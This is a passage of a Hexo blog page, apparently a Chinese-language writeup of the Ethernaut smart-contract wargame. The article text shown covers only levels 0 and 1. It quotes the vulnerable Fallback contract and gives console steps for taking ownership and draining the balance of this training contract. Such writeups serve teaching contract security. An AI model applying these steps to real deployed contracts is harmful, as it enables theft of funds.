@@ -1,0 +1,1801 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Ethernaut 靶场 Writeup | UltramanGaia&#39;s Blog</title>
+  <meta name="keywords" content=" writeup , 智能合约 ">
+  <meta name="description" content="Ethernaut 靶场 Writeup | UltramanGaia&#39;s Blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="website">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="http://ultramangaia.github.io/categories/index.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-12-23T08:37:16.000Z">
+<meta property="article:modified_time" content="2019-01-19T16:10:04.947Z">
+<meta property="article:author" content="UltramanGaia">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>UltramanGaia</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="rss" href="/atom.xml" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-rss"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="github" href="https://github.com/UltramanGaia" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:3213359017@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=3213359017&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="全部文章">全部文章<small>(35)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Web"><i class="fold iconfont icon-right"></i>Web<small>(26)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Web<--->Web安全">Web安全<small>(7)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->Writeup">Writeup<small>(14)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Web<--->漏洞挖掘">漏洞挖掘<small>(5)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Java"><i class="fold iconfont icon-right"></i>Java<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Java<--->Java安全">Java安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP"><i class="fold iconfont icon-right"></i>PHP<small>(4)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="PHP<--->PHP安全">PHP安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="PHP<--->漏洞分析">漏洞分析<small>(3)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其它"><i class="fold iconfont icon-right"></i>其它<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="其它<--->智能合约">智能合约<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="其它<--->机器学习">机器学习<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="二进制"><i class="fold iconfont icon-right"></i>二进制<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="二进制<--->PWN">PWN<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="35">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://ultramangaia.cn/">UltramanGaia</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ctf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>lua</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PWN</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>SQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sqlmap</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>stackoverflow</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ThinkPHP</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>writeup</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSS</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XSSI</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XXE</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ysoserial</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>代码执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>智能合约</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>机器学习</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>漏洞挖掘</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>请求走私</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html"
+           data-tag="漏洞挖掘,lua"
+           data-author="" >
+            <span class="post-title" title="小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）">小米系列路由器远程命令执行漏洞（CVE-2019-18370，CVE-2019-18371）</span>
+            <span class="post-date" title="2019-03-09 14:41:12">2019/03/09</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty请求走私漏洞（CVE-2020-11724）">OpenResty请求走私漏洞（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a id="top" class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/WebswingJsLink%E6%9C%BA%E5%88%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）">Webswing JsLink机制远程代码执行漏洞（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/Webswing-JsLink-Mechanism-Remote-Code-Execution-Vulnerability-CVE-2020-11103.html"
+           data-tag="代码执行"
+           data-author="" >
+            <span class="post-title" title="Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）">Webswing JsLink Mechanism Remote Code Execution Vulnerability（CVE-2020-11103）</span>
+            <span class="post-date" title="2020-03-10 10:00:41">2020/03/10</span>
+        </a>
+        
+        <a  class="全部文章 Web 漏洞挖掘 "
+           href="/blog/2020/OpenResty-Http-Request-Smuggling-Vulnerability-CVE-2020-11724.html"
+           data-tag="请求走私"
+           data-author="" >
+            <span class="post-title" title="OpenResty Http request smuggling Vulnerability（CVE-2020-11724）">OpenResty Http request smuggling Vulnerability（CVE-2020-11724）</span>
+            <span class="post-date" title="2020-02-10 10:00:41">2020/02/10</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSSI%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSSI"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSSI漏洞">Web安全之XSSI漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 Java Java安全 "
+           href="/blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"
+           data-tag="Java,ysoserial,反序列化"
+           data-author="" >
+            <span class="post-title" title="Java反序列化漏洞">Java反序列化漏洞</span>
+            <span class="post-date" title="2018-10-18 16:25:02">2018/10/18</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/ThinkPHP-3-X-5-X-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析,ThinkPHP,SQL"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP 3.X-5.X order by注入漏洞分析">ThinkPHP 3.X-5.X order by注入漏洞分析</span>
+            <span class="post-date" title="2018-09-14 10:00:41">2018/09/14</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/Ethernaut%E9%9D%B6%E5%9C%BAwriteup.html"
+           data-tag="writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="Ethernaut 靶场 Writeup">Ethernaut 靶场 Writeup</span>
+            <span class="post-date" title="2018-06-01 18:12:04">2018/06/01</span>
+        </a>
+        
+        <a  class="全部文章 其它 智能合约 "
+           href="/blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"
+           data-tag="ctf,writeup,智能合约"
+           data-author="" >
+            <span class="post-title" title="0CTF 线下 Misc ZeroLottery Writeup">0CTF 线下 Misc ZeroLottery Writeup</span>
+            <span class="post-date" title="2018-05-29 19:10:40">2018/05/29</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/starctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="StarCTF 2018 Writeup">StarCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-23 20:50:00">2018/04/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/ddctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DDCTF 2018 Writeup">DDCTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-21 03:38:49">2018/04/21</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/DedeCMS5-7%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="DedeCMS 5.7 后台两处RCE漏洞分析">DedeCMS 5.7 后台两处RCE漏洞分析</span>
+            <span class="post-date" title="2018-04-15 20:50:27">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 PHP 漏洞分析 "
+           href="/blog/2018/Drupal-Drupalgeddon-2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2018-7600.html"
+           data-tag="漏洞分析"
+           data-author="" >
+            <span class="post-title" title="Drupal Drupalgeddon 2远程代码执行漏洞分析">Drupal Drupalgeddon 2远程代码执行漏洞分析</span>
+            <span class="post-date" title="2018-04-15 01:37:57">2018/04/15</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="命令注入"
+           data-author="" >
+            <span class="post-title" title="Web安全之命令注入漏洞">Web安全之命令注入漏洞</span>
+            <span class="post-date" title="2018-04-08 19:56:45">2018/04/08</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XXE"
+           data-author="" >
+            <span class="post-title" title="Web安全之XXE漏洞">Web安全之XXE漏洞</span>
+            <span class="post-date" title="2018-04-06 11:53:41">2018/04/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/0ctf-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="0CTF 2018 Writeup">0CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-04-03 16:53:31">2018/04/03</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2018 Writeup">强网杯 CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-30 12:47:57">2018/03/30</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%BC%8F%E6%B4%9E.html"
+           data-tag="XSS"
+           data-author="" >
+            <span class="post-title" title="Web安全之XSS漏洞">Web安全之XSS漏洞</span>
+            <span class="post-date" title="2018-03-26 17:57:09">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 二进制 PWN "
+           href="/blog/2018/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PWN,stackoverflow"
+           data-author="" >
+            <span class="post-title" title="二进制安全之栈溢出漏洞">二进制安全之栈溢出漏洞</span>
+            <span class="post-date" title="2018-03-26 00:51:47">2018/03/26</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/pragyan-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pragyan CTF 2018 Writeup">Pragyan CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-03-03 00:48:28">2018/03/03</span>
+        </a>
+        
+        <a  class="全部文章 PHP PHP安全 "
+           href="/blog/2018/PHP%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"
+           data-tag="PHP"
+           data-author="" >
+            <span class="post-title" title="PHP安全之文件包含漏洞">PHP安全之文件包含漏洞</span>
+            <span class="post-date" title="2018-03-02 19:21:59">2018/03/02</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2018/Xiomara-ctf-2018.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Xiomara CTF 2018 Writeup">Xiomara CTF 2018 Writeup</span>
+            <span class="post-date" title="2018-02-28 20:23:22">2018/02/28</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"
+           data-tag="SQL"
+           data-author="" >
+            <span class="post-title" title="Web安全之SQL注入漏洞">Web安全之SQL注入漏洞</span>
+            <span class="post-date" title="2018-02-23 13:57:25">2018/02/23</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2018/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Web安全之文件上传漏洞">Web安全之文件上传漏洞</span>
+            <span class="post-date" title="2018-02-11 11:27:17">2018/02/11</span>
+        </a>
+        
+        <a  class="全部文章 其它 机器学习 "
+           href="/blog/2017/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0.html"
+           data-tag="机器学习"
+           data-author="" >
+            <span class="post-title" title="机器学习">机器学习</span>
+            <span class="post-date" title="2017-12-27 14:38:27">2017/12/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/DVWA-%E9%9D%B6%E5%9C%BA-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="DVWA 靶场 Writeup">DVWA 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-05 20:00:04">2017/12/05</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/webug3-0-writeup.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Webug3.0 靶场 Writeup">Webug3.0 靶场 Writeup</span>
+            <span class="post-date" title="2017-12-04 19:46:57">2017/12/04</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="强网杯 CTF 2017 Writeup">强网杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:36:03">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/gctf-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="GCTF 2017 Writeup">GCTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:31:56">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E4%B8%96%E5%AE%89%E6%9D%AF-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="世安杯 CTF 2017 Writeup">世安杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:21:19">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/pwn2win-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Pwn2win CTF 2017 Writeup">Pwn2win CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-27 19:11:00">2017/11/27</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/%E6%B9%96%E6%B9%98%E6%9D%AF-2017-ctf.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="湖湘杯 CTF 2017 Writeup">湖湘杯 CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-25 19:42:32">2017/11/25</span>
+        </a>
+        
+        <a  class="全部文章 Web Writeup "
+           href="/blog/2017/hitcon-ctf-2017.html"
+           data-tag="ctf,writeup"
+           data-author="" >
+            <span class="post-title" title="Hitcon CTF 2017 Writeup">Hitcon CTF 2017 Writeup</span>
+            <span class="post-date" title="2017-11-06 17:34:33">2017/11/06</span>
+        </a>
+        
+        <a  class="全部文章 Web Web安全 "
+           href="/blog/2017/%E7%BC%96%E5%86%99sqlmap-Tamper%E7%BB%95%E8%BF%87Waf.html"
+           data-tag="ctf,sqlmap"
+           data-author="" >
+            <span class="post-title" title="编写sqlmap Tamper绕过Waf">编写sqlmap Tamper绕过Waf</span>
+            <span class="post-date" title="2017-10-12 17:10:31">2017/10/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Ethernaut靶场writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Ethernaut 靶场 Writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="其它">其它</a> > 
+            
+            <a  data-rel="其它&lt;---&gt;智能合约">智能合约</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">writeup</a>
+            
+            <a class="color5">智能合约</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2020-07-16 00:47:31'>2018-06-01 18:12</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-0-Hello-Ethernaut"><span class="toc-text">level 0 Hello Ethernaut</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1-Fallback"><span class="toc-text">level 1 Fallback</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2-Fallout"><span class="toc-text">level 2 Fallout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3-Coin-Flip"><span class="toc-text">level 3 Coin Flip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4-Telephone"><span class="toc-text">level 4 Telephone</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5-Token"><span class="toc-text">level 5 Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6-Delegation"><span class="toc-text">level 6 Delegation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7-Force"><span class="toc-text">level 7 Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8-Vault"><span class="toc-text">level 8 Vault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-9-King"><span class="toc-text">level 9 King</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10-Re-entrancy"><span class="toc-text">level 10 Re-entrancy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-11-Elevator"><span class="toc-text">level 11 Elevator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-12-Privacy"><span class="toc-text">level 12 Privacy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-13-Gatekeeper-One"><span class="toc-text">level 13 Gatekeeper One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-14-Gatekeeper-Two"><span class="toc-text">level 14 Gatekeeper Two</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-15-Naught-Coin"><span class="toc-text">level 15 Naught Coin</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>ethernaut包含有15道智能合约的训练题目，我们充分了解下。(写的不会很详细，不过思路还是清晰的，有兴趣的同学自己动手试试吧)</p>
+<p><a href="https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512" target="_blank" rel="noopener">地址</a></p>
+<h3 id="level-0-Hello-Ethernaut"><a href="#level-0-Hello-Ethernaut" class="headerlink" title="level 0 Hello Ethernaut"></a>level 0 Hello Ethernaut</h3><p>试玩关，没什么挑战的。会看英文就行。</p>
+<h3 id="level-1-Fallback"><a href="#level-1-Fallback" class="headerlink" title="level 1 Fallback"></a>level 1 Fallback</h3><blockquote>
+<p>Look carefully at the contract’s code below.<br>You will beat this level if<br>you claim ownership of the contract<br>you reduce its balance to 0<br>  Things that might help<br>How to send ether when interacting with an ABI<br>How to send ether outside of the ABI<br>Converting to and from wei/ether units -see help() command-<br>Fallback methods</p>
+</blockquote>
+<p>合约代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+import &#39;zeppelin-solidity/contracts/ownership/Ownable.sol&#39;;
+
+contract Fallback is Ownable {
+
+  mapping(address =&gt; uint) public contributions;
+
+  function Fallback() public {
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  function contribute() public payable {
+    require(msg.value &lt; 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] &gt; contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    owner.transfer(this.balance);
+  }
+
+  function() payable public {
+    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+    owner = msg.sender;
+  }
+}</code></pre>
+<p>分析合约，发现只要先调用<code>contribute</code>函数，然后转一点点钱，然后再调用<code>fallback</code>函数即可。</p>
+<pre><code class="jsvascript">1. 充钱
+contract.contribute({value:1})
+此时，我们成功冲入了1 wei
+2. 调用fallcak函数
+我们使用contract.address查看到合约的地址，
+通过向该地址发送一点点ether，即可调用fallback函数，成功成为owner
+这里不知道为什么用那个插件发送ether会failed
+不过，没关系，我们可以通过调用不存在的函数或者用console的send来转钱调用
+contract.send(1)
+contract.owner()查看当前拥有者，果然我们已经成了owner
+3. 调用withdraw转走钱
+调用contract.withdraw()把钱转走</code></pre>
+<blockquote>
+<p>You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.</p>
+<p>You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.</p>
+<p>Move on to the next level when you’re ready!</p>
+</blockquote>
